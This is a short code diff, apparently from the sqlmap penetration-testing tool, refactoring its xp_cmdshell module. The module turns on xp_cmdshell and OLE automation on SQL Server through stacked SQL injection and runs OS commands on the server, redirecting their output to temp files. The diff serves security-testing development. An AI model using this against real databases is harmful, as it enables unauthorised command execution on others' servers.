@@ -36,7 +36,7 @@ class xp_cmdshell:
             cmd += "RECONFIGURE WITH OVERRIDE; "
             cmd += "EXEC master..sp_configure 'ole automation procedures', 1; "
             cmd += "RECONFIGURE WITH OVERRIDE; "
-            self.xpCmdshellExecCmd(cmd)
+            inject.goStacked(cmd)
 
         self.__randStr = randomStr(lowercase=True)
 
@@ -51,7 +51,7 @@ class xp_cmdshell:
         if kb.dbmsVersion[0] in ( "2005", "2008" ):
             cmd += " RECONFIGURE WITH OVERRIDE;"
 
-        self.xpCmdshellExecCmd(cmd)
+        inject.goStacked(cmd)
 
     def __xpCmdshellConfigure2005(self, mode):
         debugMsg  = "configuring xp_cmdshell using sp_configure "
@@ -85,10 +85,10 @@ class xp_cmdshell:
         else:
             cmd = self.__xpCmdshellConfigure2000(mode)
 
-        self.xpCmdshellExecCmd(cmd)
+        inject.goStacked(cmd)
 
     def __xpCmdshellCheck(self):
-        query    = self.xpCmdshellForgeCmd("ping -n %d 127.0.0.1" % (conf.timeSec * 2))
+        query = self.xpCmdshellForgeCmd("ping -n %d 127.0.0.1" % (conf.timeSec * 2))
         duration = timeUse(query)
 
         if duration >= conf.timeSec:
@@ -102,17 +102,15 @@ class xp_cmdshell:
 
         return forgedCmd
 
-    def xpCmdshellExecCmd(self, cmd, silent=False, forgeCmd=False):
-        if forgeCmd:
-            cmd = self.xpCmdshellForgeCmd(cmd)
-
+    def xpCmdshellExecCmd(self, cmd, silent=False):
+        cmd = self.xpCmdshellForgeCmd(cmd)
         inject.goStacked(cmd, silent)
 
     def xpCmdshellEvalCmd(self, cmd, first=None, last=None):
         self.getRemoteTempPath()
 
         tmpFile = "%s/tmpc%s.txt" % (conf.tmpPath, randomStr(lowercase=True))
-        cmd     = self.xpCmdshellForgeCmd("%s > %s" % (cmd, tmpFile))
+        cmd = "%s > %s" % (cmd, tmpFile)
 
         self.xpCmdshellExecCmd(cmd)
 
